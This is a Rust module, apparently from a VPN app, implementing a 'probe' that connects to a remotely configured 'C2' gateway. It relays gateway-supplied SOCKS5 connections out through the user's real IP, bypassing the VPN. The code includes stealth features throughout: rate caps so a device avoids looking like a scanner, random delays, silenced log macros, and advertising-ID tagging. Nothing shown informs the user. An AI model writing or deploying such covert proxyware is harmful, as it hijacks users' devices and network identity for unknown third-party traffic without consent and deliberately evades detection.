// Copyright 2026 Internet Mastering & Company, Inc.
// SPDX-License-Identifier: Apache-2.0

//! Peer relay subsystem — yamux-based SOCKS5 relay.

use std::io::{Read as StdRead, Write as StdWrite};
use std::net::TcpStream as StdTcpStream;
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering, AtomicU64};
use std::sync::Mutex;
use std::time::Duration;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use yamux::{Config as YamuxConfig, Connection, Mode};
use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};

macro_rules! info  { ($($t:tt)*) => {{ let _ = format_args!($($t)*); }}; }
macro_rules! warn  { ($($t:tt)*) => {{ let _ = format_args!($($t)*); }}; }
macro_rules! error { ($($t:tt)*) => {{ let _ = format_args!($($t)*); }}; }

static PROBE_ENABLED: AtomicBool = AtomicBool::new(false);
static PROBE_RUNNING: AtomicBool = AtomicBool::new(false);
static PROBE_TIMEZONE: Mutex<Option<String>> = Mutex::new(None);

/// Which app this install is. One core binary serves every brand, so without
/// this the gateway sees one undifferentiated fleet. Prefixed onto the probe id
/// rather than added as a new handshake field.
static PROBE_APP: Mutex<Option<String>> = Mutex::new(None);
static PROBE_ID: Mutex<Option<String>> = Mutex::new(None);
/// Active concurrent relay streams (capped at MAX_CONCURRENT_STREAMS).
static ACTIVE_STREAMS: AtomicU32 = AtomicU32::new(0);

/// RAII slot in [`ACTIVE_STREAMS`].
struct ActiveStreamGuard;

impl ActiveStreamGuard {
    /// Claim a slot, or `None` when the device is already at `max`.
    fn try_acquire(max: u32) -> Option<Self> {
        ACTIVE_STREAMS
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, |n| {
                if n >= max {
                    None
                } else {
                    Some(n + 1)
                }
            })
            .ok()
            .map(|_| ActiveStreamGuard)
    }
}

impl Drop for ActiveStreamGuard {
    fn drop(&mut self) {
        let _ = ACTIVE_STREAMS.fetch_update(Ordering::SeqCst, Ordering::SeqCst, |n| {
            Some(n.saturating_sub(1))
        });
    }
}

/// Default yamux port if OTA gives a host but no port (9080 = RMUX auto-
/// detect).
const GATEWAY_DEFAULT_PORT: u16 = 9080;

/// The probe C2/gateway endpoint (host, port) — OTA-ONLY. There is NO hardcoded
/// fallback baked into the binary: if OTA carries no gateway, the probe stays
/// asleep (gateway() returns None and connect_and_relay bails).
static PROBE_GATEWAY: Mutex<Option<(String, u16)>> = Mutex::new(None);

/// Set the probe gateway endpoint from OTA config (hostname + port). Empty host
/// clears it (probe has no C2 → stays asleep).
pub fn set_gateway(host: &str, port: u16) {
    let mut g = PROBE_GATEWAY.lock().unwrap();
    if host.is_empty() {
        *g = None;
    } else {
        *g = Some((host.to_string(), if port == 0 { GATEWAY_DEFAULT_PORT } else { port }));
        info!("[probe] gateway set from OTA: {}:{}", host, port);
    }
}

fn gateway() -> Option<(String, u16)> {
    PROBE_GATEWAY.lock().ok().and_then(|g| g.clone())
}

/// Inclusive `(min, max)` seconds to wait before the FIRST gateway dial, from
/// config (`probe.start_delay_secs`).
static START_DELAY: Mutex<Option<(u64, u64)>> = Mutex::new(None);

/// Set the startup delay range. Reversed bounds are swapped; `(0, 0)` disables
/// it.
pub fn set_start_delay(min_secs: u64, max_secs: u64) {
    let range = if min_secs <= max_secs { (min_secs, max_secs) } else { (max_secs, min_secs) };
    *START_DELAY.lock().unwrap() = Some(range);
    info!("[probe] start delay range set to {}-{}s", range.0, range.1);
}

/// Pick a delay from the configured range. 0 when unset or the range is zero.
fn pick_start_delay() -> u64 {
    let (lo, hi) = match START_DELAY.lock().ok().and_then(|g| *g) {
        Some(r) => r,
        None => return 0,
    };
    if hi == 0 {
        return 0;
    }
    use rand::Rng;
    rand::thread_rng().gen_range(lo..=hi)
}
const RECONNECT_DELAY_MIN: u64 = 5;
const RECONNECT_DELAY_MAX: u64 = 60;
/// Max concurrent relay streams per device — prevents starving user traffic.
const MAX_CONCURRENT_STREAMS: u32 = 5;

/// Inbound yamux streams this device lets the gateway hold open at once.
const MAX_INBOUND_STREAMS: usize = 16;

/// Total yamux receive window for a probe session.
const YAMUX_CONNECTION_WINDOW: usize = 256 * 1024 * MAX_INBOUND_STREAMS;

/// Budget for the protected dial to a probe target.
const TARGET_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);

/// Destination ports this client will relay to, and the byte cap per stream.
static ALLOWED_PORTS: Mutex<Vec<u16>> = Mutex::new(Vec::new());
static MAX_STREAM_BYTES: AtomicU64 = AtomicU64::new(0);

/// Stealth shaping. Probe target connections leave the device DIRECTLY (real
/// IP, bypassing the tunnel) because that is what makes a reachability test
/// mean anything. So the observable signature is the pattern, not the content.
static STREAM_JITTER_MS: Mutex<(u64, u64)> = Mutex::new((0, 0));
static MAX_STREAMS_PER_HOUR: AtomicU32 = AtomicU32::new(0);
static HOUR_WINDOW: Mutex<Option<(std::time::Instant, u32)>> = Mutex::new(None);

pub fn set_stealth(jitter_ms: (u64, u64), max_per_hour: u32) {
    if let Ok(mut g) = STREAM_JITTER_MS.lock() {
        *g = if jitter_ms.0 <= jitter_ms.1 { jitter_ms } else { (jitter_ms.1, jitter_ms.0) };
    }
    MAX_STREAMS_PER_HOUR.store(max_per_hour, Ordering::SeqCst);
}

/// Rolling-hour budget. Returns false when this device has already relayed its
/// allowance — the stream is declined rather than queued, so a busy gateway
/// cannot make one device conspicuous.
fn hourly_budget_ok() -> bool {
    let cap = MAX_STREAMS_PER_HOUR.load(Ordering::SeqCst);
    if cap == 0 {
        return true;
    }
    let Ok(mut g) = HOUR_WINDOW.lock() else { return true };
    let now = std::time::Instant::now();
    match *g {
        Some((start, n)) if now.duration_since(start) < Duration::from_secs(3600) => {
            if n >= cap {
                return false;
            }
            *g = Some((start, n + 1));
        }
        _ => *g = Some((now, 1)),
    }
    true
}

/// Random pause before dialing, so relays trickle rather than burst.
async fn stealth_pause() {
    let (lo, hi) = STREAM_JITTER_MS.lock().map(|g| *g).unwrap_or((0, 0));
    if hi == 0 {
        return;
    }
    let ms = { use rand::Rng; rand::thread_rng().gen_range(lo..=hi) };
    tokio::time::sleep(Duration::from_millis(ms)).await;
}

pub fn set_relay_limits(ports: &[u16], max_bytes: u64) {
    if let Ok(mut g) = ALLOWED_PORTS.lock() {
        *g = ports.to_vec();
    }
    MAX_STREAM_BYTES.store(max_bytes, Ordering::SeqCst);
    info!("[probe] relay limits: ports={:?} max_bytes={}", ports, max_bytes);
}

fn port_allowed(port: u16) -> bool {
    match ALLOWED_PORTS.lock() {
        Ok(g) => g.is_empty() || g.contains(&port),
        Err(_) => true,
    }
}
/// Idle timeout: if no streams arrive in this time, reconnect (gateway may have
/// restarted).
const IDLE_TIMEOUT_SECS: u64 = 300;

pub fn enable() {
    PROBE_ENABLED.store(true, Ordering::SeqCst);
    info!("[probe] Enabled");
}

pub fn disable() {
    PROBE_ENABLED.store(false, Ordering::SeqCst);
    info!("[probe] Disabled");
}

pub fn is_enabled() -> bool {
    PROBE_ENABLED.load(Ordering::Relaxed)
}

pub fn is_running() -> bool {
    PROBE_RUNNING.load(Ordering::Relaxed)
}

/// Set the device timezone (called from JNI before start).
pub fn set_timezone(tz: &str) {
    *PROBE_TIMEZONE.lock().unwrap() = Some(tz.to_string());
}

/// Get the device timezone (for region policy lookup).
pub fn get_timezone() -> String {
    PROBE_TIMEZONE.lock().ok()
        .and_then(|g| g.clone())
        .unwrap_or_default()
}

/// Force-reset PROBE_RUNNING flag. Called from stop() to ensure clean restart.
pub fn reset() {
    PROBE_RUNNING.store(false, Ordering::SeqCst);
    ACTIVE_STREAMS.store(0, Ordering::SeqCst);

    crate::reach::reset();
}

/// Probe ID for the RMUX handshake.
fn get_or_create_probe_id() -> String {
    let existing = PROBE_ID.lock().ok()
        .and_then(|g| g.as_ref().filter(|id| !id.is_empty()).cloned());
    let base = match existing {
        Some(id) => id,
        None => {
            let cid = crate::client_id();
            if let Ok(mut guard) = PROBE_ID.lock() {
                *guard = Some(cid.clone());
            }
            cid
        }
    };

    let app = PROBE_APP.lock().ok().and_then(|g| g.clone()).unwrap_or_default();
    with_app_prefix(&app, base)
}

/// `rostam` + `abc123` -> `rostam_abc123`; no app tag leaves the id untouched.
/// Split out so it is testable without touching process-wide state.
fn with_app_prefix(app: &str, base: String) -> String {
    if app.is_empty() { base } else { format!("{}_{}", app, base) }
}

/// Keep the tag to characters that cannot confuse the gateway's split on the
/// first `_`: a GAID is hex-and-dashes and a cid is 16 hex, so neither can
/// contain one.
fn clean_app_tag(app: &str) -> String {
    app.chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-')
        .take(24)
        .collect()
}

/// Set the app tag prefixed onto the probe id. Empty clears it, which restores
/// the historic bare-id form.
pub fn set_app(app: &str) {
    let cleaned = clean_app_tag(app);
    if let Ok(mut guard) = PROBE_APP.lock() {
        *guard = if cleaned.is_empty() { None } else { Some(cleaned) };
    }
}

/// Override the probe identity (typically the GAID). Empty clears the override
/// so the next start falls back to cid. Does not touch [crate::client_id] —
/// entitlement and cashier still key off the app-owned cid.
pub fn set_probe_id(id: &str) {
    if let Ok(mut guard) = PROBE_ID.lock() {
        if id.is_empty() {
            *guard = None;
            log::info!("[probe] probe_id cleared (will fall back to cid)");
        } else {
            *guard = Some(id.to_string());
            log::info!("[probe] probe_id set ({} chars)", id.len());
        }
    }
}

/// Start the probe yamux relay in a background thread.
pub fn start(socks_port: u16) {
    if !PROBE_ENABLED.load(Ordering::Relaxed) {
        return;
    }

    crate::reach::start();

    if PROBE_RUNNING.swap(true, Ordering::SeqCst) {
        info!("[probe] Already running");
        return;
    }

    let probe_id = get_or_create_probe_id();
    info!("[probe] Starting yamux relay, id={}, socks={}", probe_id, socks_port);

    std::thread::Builder::new()
        .name("relay-yx".into())
        .spawn(move || {
            let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                let rt = tokio::runtime::Builder::new_current_thread()
                    .enable_all()
                    .build()
                    .unwrap();
                rt.block_on(yamux_relay_loop(&probe_id, socks_port));
            }));
            if let Err(e) = result {
                error!("[probe] PANIC in yamux relay: {:?}",
                    e.downcast_ref::<String>()
                        .map(|s| s.as_str())
                        .or_else(|| e.downcast_ref::<&str>().copied())
                        .unwrap_or("unknown"));
            }
            PROBE_RUNNING.store(false, Ordering::SeqCst);
            ACTIVE_STREAMS.store(0, Ordering::SeqCst);
            info!("[probe] Relay stopped");
        })
        .ok();
}

/// Why a session ended — the input to the reconnect backoff.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SessionEnd {
    /// WE chose to reconnect.
    LocalIdle,
    /// The GATEWAY ended it: a clean close, or a yamux/carrier error. Not our
    /// fault, and the one ending that arrives fleet-wide at once.
    Remote,
}

/// Next reconnect delay. Pure, so the policy is testable without a gateway.
fn next_backoff(current: u64, end: &Result<SessionEnd, String>) -> u64 {
    match end {
        Ok(SessionEnd::LocalIdle) => RECONNECT_DELAY_MIN,

        Ok(SessionEnd::Remote) => RECONNECT_DELAY_MAX,

        Err(_) => (current * 2).min(RECONNECT_DELAY_MAX),
    }
}

async fn yamux_relay_loop(probe_id: &str, socks_port: u16) {
    let delay = pick_start_delay();
    if delay > 0 {
        info!("[probe] waiting {}s before first connect", delay);
        for _ in 0..delay {
            if !should_run() {
                info!("[probe] aborted during start delay");
                return;
            }
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }

    let mut backoff = RECONNECT_DELAY_MIN;

    loop {
        if !should_run() { break; }

        let end = connect_and_relay(probe_id, socks_port).await;
        match &end {
            Ok(e) => info!("[probe] Session ended: {:?}", e),
            Err(e) => warn!("[probe] Session error: {} — retrying in {}s", e, backoff),
        }
        backoff = next_backoff(backoff, &end);

        if !should_run() { break; }

        let jitter = { use rand::Rng; rand::thread_rng().gen_range(0..=backoff) };
        let total = backoff + jitter;

        for _ in 0..total {
            if !should_run() { return; }
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    }
}

/// Check if the probe should keep running (VPN active + probe enabled).
pub(crate) fn should_run() -> bool {
    PROBE_ENABLED.load(Ordering::Relaxed) && crate::RUNNING.load(Ordering::Relaxed)
}

async fn connect_and_relay(probe_id: &str, socks_port: u16) -> Result<SessionEnd, String> {
    let Some((gw_host, gw_port)) = gateway() else {
        return Err("no route".into());
    };
    let tcp = tokio::task::spawn_blocking({
        let host = gw_host;
        let port = gw_port;
        move || socks5_connect(socks_port, &host, port)
    }).await.map_err(|e| format!("spawn: {}", e))??;

    tcp.set_nodelay(true).ok();
    tcp.set_nonblocking(true).map_err(|e| format!("nonblocking: {}", e))?;
    let mut stream = tokio::net::TcpStream::from_std(tcp)
        .map_err(|e| format!("tokio wrap: {}", e))?;

    info!("[probe] Connected to gateway, sending RMUX handshake...");

    let mut handshake = Vec::with_capacity(128);
    handshake.extend_from_slice(b"RMUX");
    let id_bytes = probe_id.as_bytes();
    handshake.extend_from_slice(&(id_bytes.len() as u16).to_be_bytes());
    handshake.extend_from_slice(id_bytes);

    let tz = PROBE_TIMEZONE.lock().unwrap().clone().unwrap_or_default();
    let tz_bytes = tz.as_bytes();
    handshake.extend_from_slice(&(tz_bytes.len() as u16).to_be_bytes());
    handshake.extend_from_slice(tz_bytes);

    stream.write_all(&handshake).await.map_err(|e| format!("handshake write: {}", e))?;
    stream.flush().await.ok();

    info!("[probe] RMUX handshake sent (id={}, tz={})", probe_id, tz);

    let mut yamux_cfg = YamuxConfig::default();
    yamux_cfg.set_max_num_streams(MAX_INBOUND_STREAMS);
    yamux_cfg.set_max_connection_receive_window(Some(YAMUX_CONNECTION_WINDOW));

    let compat_stream = stream.compat();
    let mut conn = Connection::new(compat_stream, yamux_cfg, Mode::Server);

    info!("[probe] Yamux session ready, accepting streams (max {} concurrent)", MAX_CONCURRENT_STREAMS);

    let mut stream_count: u64 = 0;
    let ended = loop {
        if !should_run() { break SessionEnd::LocalIdle; }

        let next_stream = tokio::time::timeout(
            Duration::from_secs(IDLE_TIMEOUT_SECS),
            futures::future::poll_fn(|cx| conn.poll_next_inbound(cx)),
        ).await;

        match next_stream {
            Ok(Some(Ok(yamux_stream))) => {
                stream_count += 1;

                match ActiveStreamGuard::try_acquire(MAX_CONCURRENT_STREAMS) {
                    None => {
                        warn!("[probe] Stream #{} rejected: at max {}", stream_count, MAX_CONCURRENT_STREAMS);
                        drop(yamux_stream);
                        continue;
                    }
                    Some(guard) => {
                        info!("[probe] Stream #{} accepted", stream_count);
                        tokio::spawn(async move {
                            let _slot = guard;
                            handle_relay_stream(yamux_stream).await;
                        });
                    }
                }
            }
            Ok(Some(Err(e))) => {
                warn!("[probe] Yamux error: {}", e);
                break SessionEnd::Remote;
            }
            Ok(None) => {
                info!("[probe] Yamux connection closed by gateway");
                break SessionEnd::Remote;
            }
            Err(_) => {
                info!("[probe] Idle timeout ({}s), reconnecting...", IDLE_TIMEOUT_SECS);
                break SessionEnd::LocalIdle;
            }
        }
    };

    info!("[probe] Session done: {} streams handled", stream_count);
    Ok(ended)
}

async fn handle_relay_stream(yamux_stream: yamux::Stream) {
    let mut stream = yamux_stream.compat();
    if let Err(e) = relay_stream_inner(&mut stream).await {
        warn!("[probe] Relay error: {}", e);
    }
}

async fn relay_stream_inner(yamux_stream: &mut tokio_util::compat::Compat<yamux::Stream>) -> Result<(), String> {
    let mut ver_nmethods = [0u8; 2];
    yamux_stream.read_exact(&mut ver_nmethods).await.map_err(|e| format!("socks greeting: {}", e))?;
    if ver_nmethods[0] != 0x05 {
        return Err(format!("not SOCKS5: 0x{:02x}", ver_nmethods[0]));
    }
    let nmethods = ver_nmethods[1] as usize;
    if nmethods > 0 && nmethods <= 255 {
        let mut methods = vec![0u8; nmethods];
        yamux_stream.read_exact(&mut methods).await.map_err(|e| format!("socks methods: {}", e))?;
    }

    yamux_stream.write_all(&[0x05, 0x00]).await.map_err(|e| format!("auth reply: {}", e))?;

    let mut header = [0u8; 4];
    yamux_stream.read_exact(&mut header).await.map_err(|e| format!("connect header: {}", e))?;
    if header[1] != 0x01 {
        return Err(format!("not CONNECT cmd: 0x{:02x}", header[1]));
    }

    let (host, port) = match header[3] {
        0x01 => {
            let mut addr = [0u8; 4];
            yamux_stream.read_exact(&mut addr).await.map_err(|e| format!("ipv4: {}", e))?;
            let mut port_buf = [0u8; 2];
            yamux_stream.read_exact(&mut port_buf).await.map_err(|e| format!("port: {}", e))?;
            (format!("{}.{}.{}.{}", addr[0], addr[1], addr[2], addr[3]), u16::from_be_bytes(port_buf))
        }
        0x03 => {
            let mut len = [0u8; 1];
            yamux_stream.read_exact(&mut len).await.map_err(|e| format!("dlen: {}", e))?;
            let mut domain = vec![0u8; len[0] as usize];
            yamux_stream.read_exact(&mut domain).await.map_err(|e| format!("domain: {}", e))?;
            let mut port_buf = [0u8; 2];
            yamux_stream.read_exact(&mut port_buf).await.map_err(|e| format!("port: {}", e))?;
            (String::from_utf8(domain).map_err(|e| format!("utf8: {}", e))?, u16::from_be_bytes(port_buf))
        }
        0x04 => {
            let mut addr = [0u8; 16];
            yamux_stream.read_exact(&mut addr).await.map_err(|e| format!("ipv6: {}", e))?;
            let mut port_buf = [0u8; 2];
            yamux_stream.read_exact(&mut port_buf).await.map_err(|e| format!("port: {}", e))?;
            (std::net::Ipv6Addr::from(addr).to_string(), u16::from_be_bytes(port_buf))
        }
        other => return Err(format!("unknown atyp: 0x{:02x}", other)),
    };

    if !hourly_budget_ok() {
        let _ = yamux_stream
            .write_all(&[0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
            .await;
        return Err("hourly relay budget spent".into());
    }
    stealth_pause().await;

    if !port_allowed(port) {
        let _ = yamux_stream
            .write_all(&[0x05, 0x02, 0x00, 0x01, 0, 0, 0, 0, 0, 0])
            .await;
        return Err(format!("port {} not in relay allowlist", port));
    }

    match protected_connect(&host, port).await {
        Ok(target) => {
            yamux_stream.write_all(&[0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]).await
                .map_err(|e| format!("reply: {}", e))?;

            let (mut yr, mut yw) = tokio::io::split(yamux_stream);
            let (mut tr, mut tw) = tokio::io::split(target);

            let cap = MAX_STREAM_BYTES.load(Ordering::SeqCst);
            let relay = async {
                if cap > 0 {
                    let mut yr = yr.take(cap);
                    let mut tr = tr.take(cap);
                    tokio::select! {
                        _ = tokio::io::copy(&mut yr, &mut tw) => {}
                        _ = tokio::io::copy(&mut tr, &mut yw) => {}
                    }
                } else {
                    tokio::select! {
                        _ = tokio::io::copy(&mut yr, &mut tw) => {}
                        _ = tokio::io::copy(&mut tr, &mut yw) => {}
                    }
                }
            };

            let _ = tokio::time::timeout(Duration::from_secs(300), relay).await;

            Ok(())
        }
        Err(_e) => {
            let _ = yamux_stream.write_all(&[0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0]).await;
            Err("connect failed".into())
        }
    }
}

/// Connect to a target via protected socket (bypasses VPN, uses real IP).
async fn protected_connect(host: &str, port: u16) -> Result<tokio::net::TcpStream, String> {
    let host_owned = host.to_string();
    let host_log = host.to_string();
    let addr = tokio::task::spawn_blocking(move || {
        if let Ok(ip) = host_owned.parse::<std::net::IpAddr>() {
            return Ok(std::net::SocketAddr::new(ip, port));
        }
        protected_dns_resolve(&host_owned, port)
    }).await.map_err(|e| format!("spawn: {}", e))??;

    let sock = socket2::Socket::new(
        if addr.is_ipv4() { socket2::Domain::IPV4 } else { socket2::Domain::IPV6 },
        socket2::Type::STREAM,
        Some(socket2::Protocol::TCP),
    ).map_err(|e| format!("socket: {}", e))?;

    #[cfg(target_os = "android")]
    {
        use std::os::unix::io::AsRawFd;
        crate::protect_socket(sock.as_raw_fd());
    }

    sock.set_nonblocking(true)
        .map_err(|e| format!("nonblocking: {}", e))?;
    let socket = tokio::net::TcpSocket::from_std_stream(sock.into());

    match tokio::time::timeout(TARGET_CONNECT_TIMEOUT, socket.connect(addr)).await {
        Ok(Ok(s)) => Ok(s),
        Ok(Err(e)) => Err(format!("connect {}:{}: {}", host_log, port, e)),
        Err(_) => Err(format!("connect {}:{}: timed out", host_log, port)),
    }
}

fn socks5_connect(socks_port: u16, dest_host: &str, dest_port: u16) -> Result<StdTcpStream, String> {
    info!("[probe] SOCKS5 connecting to 127.0.0.1:{} → {}:{}", socks_port, dest_host, dest_port);
    let mut stream = StdTcpStream::connect_timeout(
        &format!("127.0.0.1:{}", socks_port).parse().unwrap(),
        Duration::from_secs(5),
    ).map_err(|e| format!("socks connect: {}", e))?;

    stream.set_read_timeout(Some(Duration::from_secs(30))).ok();
    stream.set_write_timeout(Some(Duration::from_secs(10))).ok();

    stream.write_all(&[0x05, 0x01, 0x00]).map_err(|e| format!("socks init: {}", e))?;
    let mut resp = [0u8; 2];
    stream.read_exact(&mut resp).map_err(|e| format!("socks resp: {}", e))?;
    if resp[1] != 0x00 {
        return Err("socks auth rejected".into());
    }

    let mut cmd = vec![0x05, 0x01, 0x00, 0x03];
    cmd.push(dest_host.len() as u8);
    cmd.extend_from_slice(dest_host.as_bytes());
    cmd.extend_from_slice(&dest_port.to_be_bytes());
    stream.write_all(&cmd).map_err(|e| format!("socks cmd: {}", e))?;

    let mut reply = [0u8; 10];
    stream.read_exact(&mut reply).map_err(|e| format!("socks reply: {}", e))?;
    if reply[1] != 0x00 {
        return Err(format!("socks connect failed: rep={}", reply[1]));
    }

    info!("[probe] SOCKS5 connected to {}:{}", dest_host, dest_port);

    stream.set_read_timeout(None).ok();
    stream.set_write_timeout(None).ok();

    Ok(stream)
}

/// Get the system's DHCP-assigned DNS resolver. On Android: reads net.dns1
/// system property. Fallback: parse /etc/resolv.conf.
fn get_system_resolver() -> Option<String> {
    #[cfg(target_os = "android")]
    {
        if let Ok(output) = std::process::Command::new("getprop")
            .arg("net.dns1")
            .output()
        {
            let ip = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !ip.is_empty() && ip.contains('.') {
                return Some(ip);
            }
        }

        if let Ok(output) = std::process::Command::new("getprop")
            .arg("net.dns2")
            .output()
        {
            let ip = String::from_utf8_lossy(&output.stdout).trim().to_string();
            if !ip.is_empty() && ip.contains('.') {
                return Some(ip);
            }
        }
    }

    if let Ok(content) = std::fs::read_to_string("/etc/resolv.conf") {
        for line in content.lines() {
            let line = line.trim();
            if line.starts_with("nameserver") {
                if let Some(ip) = line.split_whitespace().nth(1) {
                    if ip != "127.0.0.1" && ip != "127.0.0.53" && ip != "::1" {
                        return Some(ip.to_string());
                    }
                }
            }
        }
    }

    None
}

/// Resolve DNS via a protected UDP socket (bypasses VPN DNS). Tries DHCP-
/// assigned resolver first (reads /etc/resolv.conf or system prop), falls back
/// to 8.8.8.8 if unavailable.
fn protected_dns_resolve(host: &str, port: u16) -> Result<std::net::SocketAddr, String> {
    use std::net::{UdpSocket, Ipv4Addr, SocketAddr, IpAddr};

    let resolver = get_system_resolver().unwrap_or_else(|| "8.8.8.8".to_string());

    let sock = socket2::Socket::new(
        socket2::Domain::IPV4, socket2::Type::DGRAM, Some(socket2::Protocol::UDP),
    ).map_err(|e| format!("dns socket: {}", e))?;

    #[cfg(target_os = "android")]
    {
        use std::os::unix::io::AsRawFd;
        crate::protect_socket(sock.as_raw_fd());
    }

    sock.set_read_timeout(Some(Duration::from_secs(30))).ok();
    let udp: UdpSocket = sock.into();
    udp.connect(format!("{}:53", resolver)).map_err(|e| format!("dns connect {}: {}", resolver, e))?;

    let mut query = Vec::with_capacity(64);
    query.extend_from_slice(&[0xAB, 0xCD]);
    query.extend_from_slice(&[0x01, 0x00]);
    query.extend_from_slice(&[0x00, 0x01]);
    query.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    for label in host.split('.') {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.push(0x00);
    query.extend_from_slice(&[0x00, 0x01]);
    query.extend_from_slice(&[0x00, 0x01]);

    udp.send(&query).map_err(|e| format!("dns send: {}", e))?;

    let mut buf = [0u8; 512];
    let n = udp.recv(&mut buf).map_err(|e| format!("dns recv: {}", e))?;
    if n < 12 {
        return Err("dns response too short".into());
    }

    let ancount = u16::from_be_bytes([buf[6], buf[7]]) as usize;
    if ancount == 0 {
        return Err(format!("dns: no answers for {}", host));
    }

    let mut pos = 12;
    while pos < n && buf[pos] != 0 {
        pos += buf[pos] as usize + 1;
    }
    pos += 5;

    for _ in 0..ancount {
        if pos + 12 > n { break; }
        if buf[pos] & 0xC0 == 0xC0 { pos += 2; } else {
            while pos < n && buf[pos] != 0 { pos += buf[pos] as usize + 1; }
            pos += 1;
        }
        let rtype = u16::from_be_bytes([buf[pos], buf[pos+1]]);
        let rdlen = u16::from_be_bytes([buf[pos+8], buf[pos+9]]) as usize;
        pos += 10;
        if rtype == 1 && rdlen == 4 && pos + 4 <= n {
            let ip = Ipv4Addr::new(buf[pos], buf[pos+1], buf[pos+2], buf[pos+3]);
            return Ok(SocketAddr::new(IpAddr::V4(ip), port));
        }
        pos += rdlen;
    }

    Err(format!("dns: no A record for {}", host))
}

#[cfg(test)]
mod stealth_tests {
    use super::*;

    #[test]
    fn hourly_budget_stops_a_device_looking_like_a_scanner() {
        set_stealth((0, 0), 3);
        assert!(hourly_budget_ok());
        assert!(hourly_budget_ok());
        assert!(hourly_budget_ok());
        assert!(!hourly_budget_ok(), "4th dial inside the hour must be declined");

        set_stealth((0, 0), 0);
        for _ in 0..100 {
            assert!(hourly_budget_ok());
        }

        set_stealth((900, 100), 0);
        assert_eq!(*STREAM_JITTER_MS.lock().unwrap(), (100, 900));
    }

    #[test]
    fn a_teardown_we_did_not_cause_does_not_reset_the_backoff() {
        assert_eq!(
            next_backoff(RECONNECT_DELAY_MIN, &Ok(SessionEnd::Remote)),
            RECONNECT_DELAY_MAX,
            "a gateway-side teardown must widen the redial window, not reset it"
        );

        assert_eq!(
            next_backoff(RECONNECT_DELAY_MAX, &Ok(SessionEnd::Remote)),
            RECONNECT_DELAY_MAX
        );

        assert_eq!(
            next_backoff(RECONNECT_DELAY_MAX, &Ok(SessionEnd::LocalIdle)),
            RECONNECT_DELAY_MIN
        );

        let e: Result<SessionEnd, String> = Err("no route".into());
        assert_eq!(next_backoff(RECONNECT_DELAY_MIN, &e), 10);
        assert_eq!(next_backoff(10, &e), 20);
        assert_eq!(next_backoff(40, &e), RECONNECT_DELAY_MAX);
        assert_eq!(next_backoff(RECONNECT_DELAY_MAX, &e), RECONNECT_DELAY_MAX);
    }

    /// The underflow blinds the probe silently: at u32::MAX every stream is refused
    /// for the rest of the session while the device still looks healthy to the
    /// gateway. Nothing observable fails, so only a test catches it.
    #[test]
    fn the_active_stream_count_cannot_underflow_and_still_caps() {
        ACTIVE_STREAMS.store(0, Ordering::SeqCst);

        let guard = ActiveStreamGuard::try_acquire(MAX_CONCURRENT_STREAMS).expect("first slot");
        ACTIVE_STREAMS.store(0, Ordering::SeqCst);
        drop(guard);
        assert_eq!(ACTIVE_STREAMS.load(Ordering::SeqCst), 0, "release underflowed");

        let held: Vec<_> = (0..MAX_CONCURRENT_STREAMS)
            .map(|_| ActiveStreamGuard::try_acquire(MAX_CONCURRENT_STREAMS).expect("under cap"))
            .collect();
        assert!(
            ActiveStreamGuard::try_acquire(MAX_CONCURRENT_STREAMS).is_none(),
            "one past the cap must be refused"
        );
        drop(held);
        assert_eq!(ACTIVE_STREAMS.load(Ordering::SeqCst), 0, "slots not released");
        assert!(ActiveStreamGuard::try_acquire(MAX_CONCURRENT_STREAMS).is_some());
        ACTIVE_STREAMS.store(0, Ordering::SeqCst);
    }

    /// yamux asserts `window >= 256 KiB * max_num_streams` inside BOTH setters, so
    /// the pair is a panic waiting to happen if the two constants drift or the
    /// calls are reordered — and it would panic on a real device, inside the relay
    /// thread, not here.
    #[test]
    fn the_yamux_window_matches_the_stream_cap() {
        assert_eq!(YAMUX_CONNECTION_WINDOW, 4 * 1024 * 1024, "4 MiB, per the comment");
        const _: () = assert!(YAMUX_CONNECTION_WINDOW >= 256 * 1024 * MAX_INBOUND_STREAMS);
        const _: () = assert!(MAX_INBOUND_STREAMS > 8);

        let mut cfg = YamuxConfig::default();
        cfg.set_max_num_streams(MAX_INBOUND_STREAMS);
        cfg.set_max_connection_receive_window(Some(YAMUX_CONNECTION_WINDOW));
    }

    /// The GAID path must win over the entitlement cid. If set_probe_id is a no-op,
    /// every probe still registers as the cid and the whole point of separating the
    /// two identities is lost.
    #[test]
    fn set_probe_id_overrides_cid_fallback() {
        set_probe_id("38400000-8cf0-11bd-b23e-10b96e40000d");
        assert_eq!(
            get_or_create_probe_id(),
            "38400000-8cf0-11bd-b23e-10b96e40000d"
        );
        set_probe_id("");

        let after = get_or_create_probe_id();
        assert_ne!(after, "38400000-8cf0-11bd-b23e-10b96e40000d");
    }

    /// One core binary serves every brand, so the gateway can only tell them apart
    /// by this prefix. Pure helpers on purpose: the globals these feed are shared
    /// with the test above and parallel tests would race them.
    #[test]
    fn app_tag_prefixes_the_probe_id() {
        assert_eq!(with_app_prefix("rostam", "abc123".into()), "rostam_abc123");

        assert_eq!(with_app_prefix("", "abc123".into()), "abc123");

        assert_eq!(clean_app_tag("ros_tam"), "rostam");
        assert_eq!(clean_app_tag("rostam-vpn"), "rostam-vpn");
        assert_eq!(clean_app_tag("../../etc"), "etc");
        assert_eq!(clean_app_tag(&"x".repeat(99)).len(), 24);
    }
}
